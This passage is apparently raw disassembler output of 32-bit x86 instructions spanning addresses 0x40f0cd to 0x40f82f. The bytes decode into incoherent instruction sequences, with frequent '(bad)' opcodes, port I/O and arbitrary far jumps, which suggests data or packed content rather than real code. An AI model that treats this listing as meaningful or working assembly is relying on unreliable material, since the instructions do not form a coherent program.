  40f0cd:	cmp    dh,cl
  40f0cf:	pop    eax
  40f0d0:	jp     0x40f096
  40f0d2:	mov    ecx,0x24372e
  40f0d7:	int3   
  40f0d8:	dec    esi
  40f0d9:	sbb    BYTE PTR [eax+0x7c136d93],0x5e
  40f0e0:	jmp    0x40f097
  40f0e2:	xor    ch,0x9a
  40f0e5:	sahf   
  40f0e6:	je     0x40f125
  40f0e8:	push   esi
  40f0e9:	pop    ds
  40f0ea:	test   BYTE PTR [ebx-0x77],dl
  40f0ed:	xchg   esi,eax
  40f0ee:	fwait
  40f0ef:	xchg   edi,eax
  40f0f0:	mov    ds:0xde417d57,al
  40f0f5:	fwait
  40f0f6:	mov    bh,0xfe
  40f0f8:	jl     0x40f13e
  40f0fa:	fistp  QWORD PTR [eax+0xd]
  40f0fd:	jnp    0x40f11e
  40f0ff:	stc    
  40f100:	sbb    al,0xca
  40f102:	push   ds
  40f103:	mov    DWORD PTR [esi-0x4],esp
  40f106:	mov    dh,0xfe
  40f108:	cs push esi
  40f10a:	ja     0x40f149
  40f10c:	mov    edx,0xbfab06a2
  40f111:	ja     0x40f14a
  40f113:	jl     0x40f11a
  40f115:	dec    ebx
  40f116:	inc    ebp
  40f117:	or     DWORD PTR [edx+edi*1+0x5e],eax
  40f11b:	inc    esi
  40f11c:	iret   
  40f11d:	ja     0x40f19d
  40f11f:	test   BYTE PTR [edi+0x4f],dl
  40f122:	cmp    BYTE PTR [eax-0x69d83298],cl
  40f128:	(bad)
  40f12d:	push   eax
  40f12e:	jb     0x40f164
  40f130:	jge    0x40f18f
  40f132:	jp     0x40f196
  40f134:	ins    DWORD PTR es:[edi],dx
  40f135:	loop   0x40f10a
  40f137:	push   cs
  40f138:	fnstcw WORD PTR [ecx-0x2099cb47]
  40f13e:	ins    BYTE PTR es:[edi],dx
  40f13f:	je     0x40f1a1
  40f141:	sub    cl,BYTE PTR [eax]
  40f143:	fisttp QWORD PTR [esp+0x61]
  40f147:	xchg   ebx,eax
  40f148:	test   BYTE PTR [esi-0x1d],ch
  40f14b:	jecxz  0x40f133
  40f14d:	sbb    ebx,edi
  40f14f:	push   ecx
  40f150:	jle    0x40f128
  40f152:	ja     0x40f179
  40f154:	dec    ecx
  40f155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f156:	(bad)  
  40f157:	xchg   esp,eax
  40f158:	mov    bl,0xdb
  40f15a:	aaa    
  40f15b:	sub    cl,BYTE PTR [ebx-0x5b]
  40f15e:	push   ss
  40f15f:	add    ah,BYTE PTR [ecx-0x1]
  40f162:	pop    ebx
  40f163:	mov    ds:0xad2dc863,eax
  40f168:	xchg   edx,eax
  40f169:	jno    0x40f150
  40f16b:	inc    ecx
  40f16c:	stos   BYTE PTR es:[edi],al
  40f16d:	ins    DWORD PTR es:[edi],dx
  40f16e:	pop    ebp
  40f16f:	inc    ecx
  40f170:	push   esp
  40f171:	xchg   ebp,eax
  40f172:	pop    ss
  40f173:	arpl   WORD PTR [edx-0x58],di
  40f176:	pop    edi
  40f177:	mov    ah,BYTE PTR [edi+0x45ecdf5e]
  40f17d:	pop    edi
  40f17f:	daa    
  40f180:	jmp    0x40f108
  40f182:	ins    DWORD PTR es:[edi],dx
  40f183:	lds    eax,FWORD PTR [ebx]
  40f185:	xchg   eax,esi
  40f187:	mov    ds:0x437b7d0f,ax
  40f18d:	sbb    DWORD PTR [edx],ecx
  40f18f:	push   edx
  40f190:	scas   eax,DWORD PTR es:[edi]
  40f191:	mov    DWORD PTR [ebx],esp
  40f193:	cmp    bl,ch
  40f195:	jecxz  0x40f172
  40f197:	jge    0x40f1c9
  40f199:	mov    edx,0xc623f04d
  40f19f:	fisttp QWORD PTR [bx+si]
  40f1a2:	jb     0x40f182
  40f1a4:	shl    BYTE PTR [ecx+0x71a9a5bf],cl
  40f1aa:	dec    ecx
  40f1ab:	and    eax,0x89d8517e
  40f1b0:	push   esp
  40f1b1:	sahf   
  40f1b2:	(bad)  
  40f1b4:	out    0x64,eax
  40f1b6:	js     0x40f15e
  40f1b8:	sbb    al,BYTE PTR [ebp+0x5862c59f]
  40f1be:	sub    DWORD PTR [edx-0x1362800f],ecx
  40f1c4:	inc    ebx
  40f1c5:	add    dl,al
  40f1c7:	mov    ah,0xfe
  40f1c9:	mov    edx,0x4661d4e9
  40f1ce:	cmovs  eax,DWORD PTR [eax]
  40f1d1:	out    0x7c,al
  40f1d3:	mov    esi,0x7779de0e
  40f1d8:	cmp    DWORD PTR [edi],ebp
  40f1da:	jle    0x40f1ca
  40f1dc:	and    DWORD PTR [ebp+edi*2-0x1],esi
  40f1e0:	sub    eax,0x726e0051
  40f1e5:	pusha  
  40f1e6:	mov    ds:0xa0170cc3,eax
  40f1eb:	loope  0x40f209
  40f1ed:	cdq    
  40f1ee:	xor    BYTE PTR [esi],0xc1
  40f1f1:	rcr    ebx,0xaa
  40f1f4:	into   
  40f1f5:	fbld   TBYTE PTR [eax-0x29]
  40f1f8:	(bad)  
  40f1f9:	jl     0x40f250
  40f1fb:	lods   al,BYTE PTR ds:[esi]
  40f1fc:	jg     0x40f25c
  40f1fe:	icebp  
  40f1ff:	test   BYTE PTR [edx-0x643e108],al
  40f205:	mov    BYTE PTR [ebx-0x4123a883],ah
  40f20b:	adc    BYTE PTR [ebx-0x37],ah
  40f20e:	adc    DWORD PTR ds:0x1fca837b,eax
  40f214:	dec    edx
  40f215:	mov    al,ds:0xee4790f7
  40f21a:	jmp    0xf035ae21
  40f21f:	ins    DWORD PTR es:[edi],dx
  40f220:	and    dh,ah
  40f222:	fiadd  WORD PTR [ebp-0x7b]
  40f225:	sub    BYTE PTR [esi],ch
  40f227:	sub    dl,BYTE PTR [ecx-0x53faec09]
  40f22d:	mov    ebp,0x90295b32
  40f232:	ss xor al,0xce
  40f235:	repz and BYTE PTR [esi+ebp*2],bl
  40f239:	ret    0xf760
  40f23c:	or     ecx,ebx
  40f23e:	add    esi,eax
  40f240:	push   eax
  40f241:	rcl    BYTE PTR [edi-0x282b1bc1],1
  40f247:	sub    ebx,DWORD PTR [eax+0x35]
  40f24a:	pop    ss
  40f24b:	fld    DWORD PTR [ebp-0x2b]
  40f24e:	test   al,0x7b
  40f250:	out    0xb7,al
  40f252:	call   0x7c893450
  40f257:	popa   
  40f258:	ins    DWORD PTR es:[edi],dx
  40f259:	jne    0x40f233
  40f25b:	mov    DWORD PTR [ebx+0x23],ecx
  40f25e:	xor    edi,ebp
  40f260:	cmp    eax,0x893637d3
  40f265:	adc    BYTE PTR [ebx+0x20],bl
  40f268:	ins    BYTE PTR es:[edi],dx
  40f269:	call   0x5d06fa15
  40f26e:	cld    
  40f26f:	cli    
  40f270:	std    
  40f271:	sbb    dh,BYTE PTR [esi]
  40f273:	aaa    
  40f274:	and    DWORD PTR [ebx],esi
  40f276:	sti    
  40f277:	jmp    0x40f207
  40f279:	aam    0x81
  40f27b:	xchg   esp,eax
  40f27c:	jns    0x40f2bd
  40f27e:	fild   DWORD PTR [esp+ebp*8-0xbbea033]
  40f285:	mov    cl,0x87
  40f287:	in     eax,0x33
  40f289:	mov    ah,0xec
  40f28b:	cmp    DWORD PTR [ebp+0x55],esp
  40f28e:	cmp    BYTE PTR [esi-0x3],dh
  40f291:	(bad)  [eax]
  40f293:	mov    ch,0x37
  40f295:	in     al,0xbe
  40f297:	loopne 0x40f26d
  40f299:	lahf   
  40f29a:	retf   0x4286
  40f29d:	dec    esp
  40f29e:	cld    
  40f29f:	shl    ebp,cl
  40f2a1:	push   0xc8ede1bc
  40f2a6:	int    0xaa
  40f2a8:	inc    ebp
  40f2a9:	jl     0x40f263
  40f2ab:	pop    ds
  40f2ac:	fnstsw WORD PTR [ebx-0x42]
  40f2af:	mov    dl,ah
  40f2b1:	cli    
  40f2b2:	xor    ebp,DWORD PTR [eax]
  40f2b4:	pop    ebx
  40f2b5:	idiv   DWORD PTR [ecx]
  40f2b7:	fs std 
  40f2b9:	hlt    
  40f2ba:	stos   DWORD PTR es:[edi],eax
  40f2bb:	mov    eax,0xe92393f7
  40f2c0:	inc    edx
  40f2c1:	stos   DWORD PTR es:[edi],eax
  40f2c2:	call   0xf561:0x2370fb
  40f2c9:	(bad)  
  40f2ca:	push   esi
  40f2cb:	or     bh,dl
  40f2cd:	mov    bh,0x4d
  40f2cf:	or     ebx,DWORD PTR [edi]
  40f2d1:	cmp    edi,eax
  40f2d3:	jmp    0x40f343
  40f2d5:	out    dx,al
  40f2d6:	and    DWORD PTR [eax+0x724c1289],edx
  40f2dc:	push   esp
  40f2dd:	(bad)  
  40f2de:	fwait
  40f2df:	jmp    0x40569802
  40f2e4:	sub    bl,BYTE PTR ds:0xdce18d98
  40f2ea:	in     eax,0x86
  40f2ec:	bound  esp,QWORD PTR [eax-0x7c]
  40f2ef:	jmp    0x40f345
  40f2f1:	and    al,0x89
  40f2f3:	mov    ebp,0x327a8dca
  40f2f8:	cwde   
  40f2f9:	and    DWORD PTR [edx+ecx*1],0x31
  40f2fd:	lds    ebp,FWORD PTR [edi+0x55]
  40f300:	iret   
  40f301:	icebp  
  40f302:	dec    esp
  40f303:	push   es
  40f304:	jp     0x40f358
  40f306:	ror    DWORD PTR [eax+0x18],0x35
  40f30a:	xchg   ecx,eax
  40f30b:	and    BYTE PTR [esi+0x616196d6],dl
  40f311:	dec    ebx
  40f312:	adc    cl,BYTE PTR [ecx]
  40f314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f315:	sub    al,0xce
  40f317:	jg     0x40f368
  40f319:	and    al,BYTE PTR ds:[edi]
  40f31c:	sbb    eax,0xe8607005
  40f321:	ins    BYTE PTR es:[edi],dx
  40f322:	neg    BYTE PTR [edi-0x7bb27af7]
  40f328:	jmp    0x40f2f0
  40f32a:	sti    
  40f32b:	cwde   
  40f32c:	or     BYTE PTR ds:0xd4767fab,0x44
  40f333:	sub    esi,DWORD PTR [edi]
  40f335:	cmp    eax,0x162e5a17
  40f33a:	sub    edi,eax
  40f33c:	(bad)  
  40f33e:	fninit 
  40f340:	push   0x97cd2f8
  40f345:	pop    ebx
  40f346:	mov    bl,0x9d
  40f348:	cld    
  40f349:	in     al,dx
  40f34a:	test   al,0xd4
  40f34c:	jae    0x40f31e
  40f34e:	mov    DWORD PTR [eax+0x7a],esi
  40f351:	prefetch (bad)
  40f352:	or     eax,0x53c479f7
  40f357:	pop    es
  40f358:	(bad)  
  40f359:	mov    al,0xb6
  40f35b:	jecxz  0x40f2f4
  40f35d:	mov    dh,0x4f
  40f35f:	dec    edx
  40f360:	fisubr DWORD PTR [edi]
  40f362:	push   ecx
  40f363:	inc    eax
  40f364:	sub    BYTE PTR [eax*8-0x29fd1a8e],dl
  40f36b:	sub    edx,DWORD PTR [edi]
  40f36d:	rol    BYTE PTR [eax+eax*1+0x7c],1
  40f371:	dec    esp
  40f372:	and    eax,0x1c78fbb0
  40f377:	xchg   edi,eax
  40f378:	mov    esi,0x75c8572f
  40f37d:	xor    DWORD PTR [edx-0x41cf3594],ecx
  40f383:	push   0xf264049c
  40f388:	inc    ebx
  40f389:	mov    dh,0xf0
  40f38b:	fwait
  40f38c:	mov    bh,BYTE PTR [ecx*8-0x3ef427ff]
  40f393:	and    al,0xb6
  40f395:	in     al,dx
  40f396:	sub    al,al
  40f398:	adc    eax,0x3b7a18b1
  40f39d:	inc    BYTE PTR [ecx]
  40f39f:	adc    edi,DWORD PTR [ebp+0x9]
  40f3a2:	mov    WORD PTR ds:0xba624118,ds
  40f3a8:	pop    ds
  40f3a9:	arpl   di,ax
  40f3ab:	ficom  WORD PTR [edx+0x50]
  40f3ae:	ds and dl,0xd2
  40f3b2:	and    BYTE PTR [edx],dl
  40f3b4:	cmc    
  40f3b5:	or     cl,BYTE PTR [edx]
  40f3b7:	sub    eax,0xc3a1c7ae
  40f3bc:	pop    ebp
  40f3bd:	test   al,0xcc
  40f3bf:	lahf   
  40f3c0:	and    BYTE PTR [edi+0x37ad19b4],0xc7
  40f3c7:	jo     0x40f3c5
  40f3c9:	ror    DWORD PTR [esi-0x44],0xf1
  40f3cd:	(bad)  
  40f3ce:	cmp    cl,cl
  40f3d0:	clc    
  40f3d1:	arpl   ax,cx
  40f3d3:	scas   eax,DWORD PTR es:[edi]
  40f3d4:	push   0x9f3a0955
  40f3d9:	jmp    0x40f421
  40f3db:	popa   
  40f3dc:	popa   
  40f3dd:	pop    es
  40f3de:	(bad)  
  40f3df:	mov    al,ds:0xe119242c
  40f3e4:	retf   
  40f3e5:	aaa    
  40f3e6:	add    edi,DWORD PTR [ebx+0x46a57a77]
  40f3ec:	sbb    dh,BYTE PTR [edi]
  40f3ee:	jle    0x40f44c
  40f3f0:	(bad)  
  40f3f1:	mov    bh,0xcb
  40f3f3:	xchg   ecx,eax
  40f3f4:	cmp    esi,DWORD PTR [esi]
  40f3f6:	test   BYTE PTR [esi+0x7a8151a3],ch
  40f3fc:	dec    ebx
  40f3fd:	aas    
  40f3fe:	pop    ds
  40f3ff:	inc    ebx
  40f400:	jbe    0x40f3eb
  40f402:	push   ecx
  40f403:	fcomp  QWORD PTR [edi+0x5e769870]
  40f409:	pop    edi
  40f40a:	xchg   ecx,eax
  40f40b:	dec    edi
  40f40c:	stc    
  40f40d:	xchg   esi,eax
  40f40e:	push   0xfffffff1
  40f410:	mov    al,0xe6
  40f412:	rol    dh,0xc1
  40f415:	test   al,0x6b
  40f417:	mov    dh,BYTE PTR [eax+0x7e6d90b9]
  40f41d:	shl    BYTE PTR [esi],0xc0
  40f420:	dec    esp
  40f421:	cmp    al,ch
  40f423:	push   es
  40f424:	add    ebp,esi
  40f426:	jge    0x40f3bb
  40f428:	xor    DWORD PTR [esi],edi
  40f42a:	fwait
  40f42b:	cmc    
  40f42c:	addr16 lahf 
  40f42e:	jge    0x40f43f
  40f430:	mov    dl,0x96
  40f432:	jge    0x40f48c
  40f434:	add    al,0x98
  40f436:	lock jg 0x40f432
  40f439:	in     eax,0x9f
  40f43b:	and    BYTE PTR [edi],0x55
  40f43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f43f:	cmp    edi,ebp
  40f441:	jae    0x40f3e2
  40f443:	(bad)  
  40f444:	sar    DWORD PTR [edi],1
  40f446:	sbb    al,0x71
  40f448:	dec    ebp
  40f449:	dec    ebx
  40f44a:	out    0x19,al
  40f44c:	ret    
  40f44d:	or     eax,0xb918d3cd
  40f452:	out    dx,eax
  40f453:	push   cs
  40f454:	push   esp
  40f455:	and    al,0x16
  40f457:	and    ebp,DWORD PTR [ebx+0x5d]
  40f45a:	mov    ds:0xdc9c8228,eax
  40f45f:	inc    edi
  40f460:	adc    al,0xf6
  40f462:	mov    ebp,0xbeaf831a
  40f467:	pop    ss
  40f468:	(bad)  
  40f46a:	cmp    al,0x2a
  40f46c:	jo     0x40f448
  40f46e:	push   esi
  40f46f:	jb     0x40f417
  40f471:	or     esp,DWORD PTR [eax+0x2e]
  40f474:	pop    esp
  40f475:	rcr    BYTE PTR [ebp+0x471fb2d8],0x5c
  40f47c:	imul   ebp,DWORD PTR ds:[ebx],0x42
  40f480:	fistp  DWORD PTR ds:0xf345dd32
  40f486:	jns    0x40f4c3
  40f488:	cmp    ah,BYTE PTR [edx-0x56bc1afb]
  40f48e:	xor    BYTE PTR [eax-0x46],ah
  40f491:	sbb    DWORD PTR [edx+0x6e276cc0],ecx
  40f497:	ins    DWORD PTR es:[edi],dx
  40f498:	(bad)  
  40f499:	mov    bh,0x9f
  40f49b:	mov    esp,DWORD PTR [ebx-0x31]
  40f49e:	push   0xe84aad0c
  40f4a3:	daa    
  40f4a4:	adc    al,0xfc
  40f4a6:	xlat   BYTE PTR ds:[ebx]
  40f4a7:	mov    ah,BYTE PTR [eax]
  40f4a9:	pop    edi
  40f4aa:	std    
  40f4ab:	bound  edx,QWORD PTR [esi-0x50]
  40f4ae:	pop    ebx
  40f4af:	fidiv  WORD PTR [edi+0x7c194971]
  40f4b5:	jns    0x40f4bc
  40f4b7:	inc    edx
  40f4b8:	adc    al,0x32
  40f4ba:	dec    edi
  40f4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bc:	dec    edi
  40f4bd:	and    DWORD PTR [ecx+0x48ee77c5],eax
  40f4c3:	sub    eax,DWORD PTR [eax]
  40f4c5:	xchg   ebx,eax
  40f4c6:	sbb    al,0xb6
  40f4c8:	pop    ebp
  40f4c9:	and    al,0xad
  40f4cb:	mov    ah,0x82
  40f4cd:	cmp    BYTE PTR [ebx-0x1f],bl
  40f4d0:	ficom  DWORD PTR [edx+eiz*2+0x30]
  40f4d4:	fisubr WORD PTR [ebx+0x3ddb3cdd]
  40f4da:	(bad)  
  40f4db:	std    
  40f4dc:	shr    bl,cl
  40f4de:	mov    al,ds:0x422d43f5
  40f4e3:	xchg   BYTE PTR [edi+0x3d],cl
  40f4e6:	jno    0x40f530
  40f4e8:	rcr    bh,cl
  40f4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4eb:	dec    edx
  40f4ec:	inc    ebx
  40f4ed:	lock xchg esp,eax
  40f4ef:	cmp    esp,eax
  40f4f1:	cmc    
  40f4f2:	imul   edi,DWORD PTR [edi],0xffffff9d
  40f4f5:	nop
  40f4f6:	or     al,0xd7
  40f4f8:	mov    edx,0xdd524f80
  40f4fd:	dec    ecx
  40f4fe:	add    dh,BYTE PTR [edx-0x15]
  40f501:	aaa    
  40f502:	sub    ebp,DWORD PTR [edx+0x71]
  40f505:	adc    edx,DWORD PTR [eax+0x71f50326]
  40f50b:	popa   
  40f50c:	ins    BYTE PTR es:[edi],dx
  40f50d:	(bad)  
  40f50f:	xor    ebx,edx
  40f511:	(bad)  
  40f512:	cli    
  40f513:	(bad)  
  40f514:	hlt    
  40f515:	stc    
  40f516:	dec    ebp
  40f517:	add    dl,BYTE PTR [eax+0x2b]
  40f51a:	cdq    
  40f51b:	ret    0x4bc6
  40f51e:	adc    DWORD PTR [esi+0x38],edi
  40f521:	mov    ecx,ebp
  40f523:	out    dx,eax
  40f524:	cld    
  40f525:	adc    al,0x5b
  40f527:	lods   al,BYTE PTR ds:[esi]
  40f528:	sbb    al,BYTE PTR [eax-0x79640f5a]
  40f52e:	ret    0xb39e
  40f531:	mov    WORD PTR [eax],?
  40f533:	mov    al,ds:0xadbcee
  40f538:	call   0x1278:0x996fff8c
  40f53f:	daa    
  40f540:	lahf   
  40f541:	clc    
  40f542:	or     edx,ecx
  40f544:	pop    ss
  40f545:	push   edi
  40f546:	retf   
  40f547:	sti    
  40f548:	daa    
  40f549:	ret    0x88b9
  40f54c:	pushf  
  40f54d:	jmp    0x6be8:0x5d446444
  40f554:	frstor [edx-0x1b]
  40f557:	out    0xdd,eax
  40f559:	ss pop ds
  40f55b:	xchg   ebp,eax
  40f55c:	jae    0x40f551
  40f55e:	rcr    bh,1
  40f560:	jle    0x40f5be
  40f562:	dec    eax
  40f563:	ror    edx,0xb5
  40f566:	push   ebp
  40f567:	dec    eax
  40f568:	mov    WORD PTR [esp+eax*2+0x4e18cedf],ds
  40f56f:	mov    bh,0x25
  40f571:	(bad)  
  40f572:	(bad)  
  40f574:	xchg   edi,eax
  40f575:	sub    cl,BYTE PTR ds:0x950116a6
  40f57b:	(bad)  
  40f57c:	mov    DWORD PTR [edi-0x1bf49bd9],esp
  40f582:	jns    0x40f52f
  40f584:	inc    edx
  40f585:	ret    0x939e
  40f588:	inc    ebp
  40f589:	iret   
  40f58a:	cmc    
  40f58b:	das    
  40f58c:	int    0x58
  40f58e:	sbb    al,0x8c
  40f590:	sbb    ah,cl
  40f592:	mov    edi,0x2324076
  40f597:	nop/reserved BYTE PTR [edi+ebp*1]
  40f59b:	scas   eax,DWORD PTR es:[edi]
  40f59c:	jmp    0xdfba5af7
  40f5a1:	push   edx
  40f5a2:	ds nop
  40f5a4:	push   cs
  40f5a5:	(bad)  
  40f5a6:	xor    eax,0xf4c00b59
  40f5ab:	xchg   ebp,eax
  40f5ac:	fstp   QWORD PTR [eax-0x560bcc8f]
  40f5b2:	add    eax,0xec7c24c1
  40f5b7:	add    eax,0x9bbafb6e
  40f5bc:	aam    0x2
  40f5be:	pop    ds
  40f5bf:	retf   
  40f5c0:	retf   
  40f5c1:	inc    edx
  40f5c2:	test   BYTE PTR [edi+0x78b42237],0x33
  40f5c9:	dec    edx
  40f5ca:	jmp    0x4ad7:0xa3c7432f
  40f5d1:	jg     0x40f61e
  40f5d3:	out    0x2c,eax
  40f5d5:	inc    eax
  40f5d6:	retf   
  40f5d7:	jnp    0x40f598
  40f5d9:	sub    BYTE PTR [eax-0x80],cl
  40f5dc:	enter  0xd4e0,0x3d
  40f5e0:	aas    
  40f5e1:	pushf  
  40f5e2:	inc    ebp
  40f5e3:	or     DWORD PTR [eax],edi
  40f5e5:	push   0x7cdd77c0
  40f5ea:	xor    al,0xdc
  40f5ec:	icebp  
  40f5ed:	popa   
  40f5ee:	adc    al,0x5d
  40f5f0:	mov    ecx,0xbf23b389
  40f5f5:	fwait
  40f5f6:	mov    BYTE PTR [ebp+0x27],bl
  40f5f9:	cs inc eax
  40f5fb:	add    BYTE PTR [ebx],dh
  40f5fd:	mov    bl,0xbb
  40f5ff:	int3   
  40f600:	(bad)  
  40f601:	mov    ecx,0xe0dce985
  40f606:	lods   al,BYTE PTR ds:[esi]
  40f607:	fwait
  40f608:	fwait
  40f609:	loopne 0x40f5f1
  40f60b:	pop    ss
  40f60c:	pop    es
  40f60d:	lods   al,BYTE PTR ds:[esi]
  40f60e:	iret   
  40f60f:	push   es
  40f610:	loope  0x40f5a0
  40f612:	es int3 
  40f614:	jne    0x40f679
  40f616:	scas   eax,DWORD PTR es:[edi]
  40f617:	pop    ds
  40f618:	es (bad) 
  40f61a:	fcomp  QWORD PTR [ecx-0x38d166d6]
  40f620:	lds    ebx,FWORD PTR [ebx]
  40f622:	mov    edi,0xca004699
  40f627:	sub    eax,0x8bc90e60
  40f62c:	jecxz  0x40f6a3
  40f62e:	clc    
  40f62f:	ror    ebx,cl
  40f631:	adc    DWORD PTR [eax+ebx*4+0x1dd7ab8a],ebx
  40f638:	or     ebx,ecx
  40f63a:	sbb    ecx,ecx
  40f63c:	xchg   edx,eax
  40f63d:	pop    ebp
  40f63e:	jno    0x40f619
  40f640:	rcr    DWORD PTR [esi],0xf9
  40f643:	in     al,0x32
  40f645:	add    eax,0x8661b995
  40f64a:	pop    ecx
  40f64b:	mov    ds:0xfcda004c,al
  40f650:	inc    BYTE PTR ds:0x14aab398
  40f656:	sbb    DWORD PTR [ebx+0x2b489e],0xd61d463d
  40f660:	loop   0x40f699
  40f662:	test   DWORD PTR [eax-0x4a],esp
  40f665:	mov    esi,0xd10916cc
  40f66a:	test   al,0xc6
  40f66c:	pushf  
  40f66d:	ja     0x40f64d
  40f66f:	(bad)  
  40f670:	sub    eax,ebp
  40f672:	lahf   
  40f673:	std    
  40f674:	int    0xe5
  40f676:	sbb    bh,bl
  40f678:	push   edi
  40f679:	xchg   BYTE PTR [edx+0x2364bb3d],al
  40f67f:	fcom   QWORD PTR [edx+0xbb2c26b]
  40f685:	je     0x40f673
  40f687:	les    ebp,FWORD PTR [eax]
  40f689:	pop    esi
  40f68a:	fnstsw WORD PTR ds:0xd75f702e
  40f690:	jno    0x40f636
  40f692:	lock adc eax,DWORD PTR [ecx]
  40f695:	dec    eax
  40f696:	fiadd  WORD PTR [edi-0x192507ee]
  40f69c:	adc    ch,BYTE PTR [ecx-0x3e994b8c]
  40f6a2:	and    BYTE PTR [edx],al
  40f6a4:	adc    DWORD PTR [ebp+0x4077bbd8],0xffffffac
  40f6ab:	aas    
  40f6ac:	leave  
  40f6ad:	inc    ecx
  40f6ae:	call   FWORD PTR [eax+0x14]
  40f6b1:	xchg   edi,eax
  40f6b2:	ins    BYTE PTR es:[edi],dx
  40f6b3:	je     0x40f6c7
  40f6b5:	jmp    0xe2f1:0x1c797cde
  40f6bc:	add    ah,cl
  40f6be:	add    DWORD PTR [eax],ecx
  40f6c0:	(bad)  
  40f6c1:	(bad)  [edx]
  40f6c3:	pop    ss
  40f6c4:	jg     0x40f6db
  40f6c6:	loope  0x40f6af
  40f6c8:	(bad)  
  40f6c9:	loope  0x40f69f
  40f6cb:	int    0x9f
  40f6cd:	xchg   edx,eax
  40f6ce:	mov    ch,0x6f
  40f6d0:	scas   al,BYTE PTR es:[edi]
  40f6d1:	jns    0x40f6a6
  40f6d3:	inc    eax
  40f6d4:	fadd   DWORD PTR [edi+eiz*4+0x24d27c89]
  40f6db:	mov    al,ds:0x109a74cd
  40f6e0:	mov    bh,0xc9
  40f6e2:	adc    BYTE PTR [edx+0x600a567f],ch
  40f6e8:	fist   DWORD PTR [edi-0x6a797f42]
  40f6ee:	into   
  40f6ef:	inc    esi
  40f6f0:	pop    ds
  40f6f1:	mov    edx,0x3489dc00
  40f6f6:	fnstenv [ebx]
  40f6f8:	and    BYTE PTR [esi+0x126f60c0],ch
  40f6fe:	dec    ebx
  40f6ff:	cs scas al,BYTE PTR es:[edi]
  40f701:	inc    ebx
  40f702:	push   DWORD PTR [ecx+0x6c04411e]
  40f708:	mov    WORD PTR [edx],cs
  40f70a:	sbb    al,0xf8
  40f70c:	stc    
  40f70d:	and    dl,ah
  40f70f:	std    
  40f710:	inc    ecx
  40f711:	pushf  
  40f712:	jle    0x40f751
  40f714:	pop    ss
  40f715:	(bad)  
  40f716:	out    0xc5,eax
  40f718:	push   eax
  40f719:	jnp    0x40f708
  40f71b:	add    dh,BYTE PTR [ebp+ebx*1-0x36]
  40f71f:	inc    ecx
  40f720:	jne    0x40f767
  40f722:	add    al,0x9e
  40f724:	mov    esp,0x54fdd833
  40f729:	sahf   
  40f72a:	xchg   esp,eax
  40f72b:	jp     0x40f75b
  40f72d:	mov    WORD PTR [ebp+0x20],?
  40f730:	pushf  
  40f731:	(bad)  [edi+ebx*4]
  40f734:	arpl   WORD PTR [edi+edx*2-0x79],di
  40f738:	or     cl,BYTE PTR [ecx-0x179119e8]
  40f73e:	xchg   edi,eax
  40f73f:	out    dx,eax
  40f740:	mov    eax,ds:0xc5f78942
  40f745:	xchg   ecx,eax
  40f746:	push   ebx
  40f747:	popf   
  40f748:	cmp    DWORD PTR [esi+0x1c417ede],0xffffffc5
  40f74f:	sbb    ebp,DWORD PTR [esi]
  40f751:	sar    BYTE PTR [eax-0x2b],0xf
  40f755:	fs lahf 
  40f757:	shl    BYTE PTR [ecx+edi*2+0x1e],0x7c
  40f75c:	inc    ebx
  40f75d:	push   ecx
  40f75e:	push   edi
  40f75f:	jb     0x40f731
  40f761:	es in  al,0x4c
  40f764:	and    DWORD PTR [ebp+edi*2-0x5efd283],esi
  40f76b:	jne    0x40f708
  40f76d:	std    
  40f76e:	xlat   BYTE PTR ds:[ebx]
  40f76f:	or     eax,DWORD PTR [ecx+0x679d8bb]
  40f775:	jl     0x40f74c
  40f777:	(bad)  
  40f778:	aaa    
  40f779:	shl    DWORD PTR [ebx+0x56406ee],0x36
  40f780:	pusha  
  40f781:	jp     0x40f74e
  40f783:	out    0x90,eax
  40f785:	std    
  40f786:	ficomp DWORD PTR [esi+0x74]
  40f789:	sub    al,0x48
  40f78b:	mov    ds:0x4c5ce36e,al
  40f790:	outs   dx,BYTE PTR es:[esi]
  40f792:	adc    edi,DWORD PTR [edi]
  40f794:	(bad)  
  40f795:	call   0xc186d6ad
  40f79a:	mov    esi,0xeeff4c6e
  40f79f:	js     0x40f767
  40f7a1:	xor    eax,0xa9df8c0
  40f7a6:	mov    ch,0xa8
  40f7a8:	or     bh,BYTE PTR [edi+0x2d5431fd]
  40f7ae:	sti    
  40f7af:	pop    ebx
  40f7b0:	jns    0x40f830
  40f7b2:	cld    
  40f7b3:	lods   eax,DWORD PTR ds:[esi]
  40f7b4:	sbb    esi,DWORD PTR [ecx+0x74]
  40f7b7:	fstp   QWORD PTR [ebx+0x33]
  40f7ba:	mov    bh,BYTE PTR [edx+ebx*4]
  40f7bd:	jle    0x40f77e
  40f7bf:	jmp    0x9e058fce
  40f7c4:	sbb    esi,DWORD PTR [edi+esi*2-0x10593c7d]
  40f7cb:	aas    
  40f7cc:	pop    ebx
  40f7cd:	clc    
  40f7ce:	retf   
  40f7cf:	in     eax,dx
  40f7d0:	cmp    ecx,esp
  40f7d2:	fbstp  TBYTE PTR [ecx]
  40f7d4:	outs   dx,DWORD PTR ds:[esi]
  40f7d5:	jp     0x40f7b3
  40f7d7:	push   esi
  40f7d8:	pop    ecx
  40f7d9:	and    BYTE PTR [ebx-0x1e429851],0x16
  40f7e0:	inc    esp
  40f7e1:	out    dx,eax
  40f7e2:	pop    esi
  40f7e3:	or     al,0xfb
  40f7e6:	aam    0xf7
  40f7e8:	(bad)  
  40f7e9:	jmp    0x2ef4:0x4cb5f770
  40f7f0:	inc    eax
  40f7f1:	dec    ebx
  40f7f2:	dec    ecx
  40f7f3:	cs (bad) 
  40f7f5:	cmp    eax,0x8a794c51
  40f7fa:	xchg   ebp,eax
  40f7fb:	jnp    0x40f7cd
  40f7fd:	xchg   DWORD PTR [eax+0x70],ecx
  40f800:	or     cl,BYTE PTR ds:0x9ba5d3a9
  40f806:	call   0x75db:0x398b65cb
  40f80d:	pop    ds
  40f80e:	mul    DWORD PTR [ebx+0xa24c8f7]
  40f814:	ds jge 0x40f81b
  40f817:	int3   
  40f818:	sub    al,0xb1
  40f81a:	adc    eax,0x8753ee80
  40f81f:	retf   
  40f820:	fsubr  st,st(0)
  40f822:	cmp    DWORD PTR ds:0xfcad81d7,esi
  40f828:	dec    esp
  40f829:	aaa    
  40f82a:	(bad)  
  40f82b:	data16 (bad) 
  40f82d:	jns    0x40f7ea
  40f82f:	push   eax
